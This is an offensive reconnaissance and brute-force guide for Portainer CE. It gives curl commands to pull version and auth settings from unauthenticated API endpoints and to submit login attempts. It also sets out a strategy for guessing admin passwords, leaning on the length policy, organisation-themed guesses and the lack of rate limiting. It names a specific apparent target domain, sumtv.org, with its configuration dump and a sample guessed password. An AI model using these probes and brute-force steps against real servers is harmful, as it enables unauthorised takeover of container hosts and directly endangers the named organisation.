# Portainer CE Public API Reconnaissance

Portainer CE exposes two endpoints without authentication that leak
version, configuration, and deployment details. Always probe these before
attempting brute-force login.

## Unauthenticated Endpoints

| Endpoint | Auth Required | Returns |
|----------|--------------|---------|
| `/api/status` | No | `{"Version":"2.33.6","InstanceID":"..."}` |
| `/api/settings/public` | No | Full deployment config (see below) |
| `/api/endpoints` | Yes (401) | Docker endpoints managed |
| `/api/users` | Yes (401) | User list |
| `/api/teams` | Yes (401) | Teams |

## `/api/settings/public` Intelligence

```bash
curl -sk 'https://docker.TARGET/api/settings/public' | python3 -m json.tool
```

Key fields:
- `AuthenticationMethod`: 1 = internal (password), 2 = LDAP, 3 = OAuth
  - 1 means local user DB — brute-force possible with username list
- `RequiredPasswordLength`: minimum password length (e.g., 12)
  - If 12+: admin password must be 12+ chars — skip short wordlists
- `EnableEdgeComputeFeatures`: true/false — edge agent network
- `TeamSync`: true/false — external directory sync
- `Edge.CheckinInterval`: seconds — edge agent poll frequency
- `GlobalDeploymentOptions.hideStacksFunctionality`: true/false

Real-world example (sumtv.org docker.sumtv.org v2.33.6):
```json
{
  "LogoURL": "",
  "AuthenticationMethod": 1,
  "RequiredPasswordLength": 12,
  "GlobalDeploymentOptions": {"hideStacksFunctionality": false},
  "EnableEdgeComputeFeatures": false,
  "Features": {"hsts": false, "csp": false},
  "OAuthLoginURI": "",
  "OAuthLogoutURI": "",
  "EnableTelemetry": false,
  "KubeconfigExpiry": "0",
  "TeamSync": false,
  "IsAMTEnabled": false,
  "Edge": {"PingInterval": 0, "SnapshotInterval": 0,
           "CommandInterval": 0, "CheckinInterval": 5},
  "IsDockerDesktopExtension": false
}
```

## Portainer Login

Portainer uses a JWT-based API auth:
```bash
curl -sk -X POST 'https://docker.TARGET/api/auth' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"PASSWORD"}'
```
- 200 → returns `{"jwt":"..."}` — use as `Authorization: Bearer <jwt>`
- 422 → `{"message":"Invalid credentials","details":"Unauthorized"}`
- 400 → malformed request (e.g., empty password, wrong JSON)

## Portainer Version History (for CVE matching)

Versions to watch:
- 2.33.6 (2025 Q4) — current as of sumtv.org engagement
- Prior versions have had auth bypass CVEs — always search for version-specific CVEs

## Brute-Force Strategy

Since `AuthenticationMethod: 1` means local auth:
1. Default: `admin` (username often cannot be changed in CE)
2. Respect `RequiredPasswordLength` — if 12, skip short passwords
3. Try organization-themed 12+ char passwords first (e.g., `SecretsofSUMtv2024!`)
4. Portainer has no built-in rate limiting — brute-force IS viable
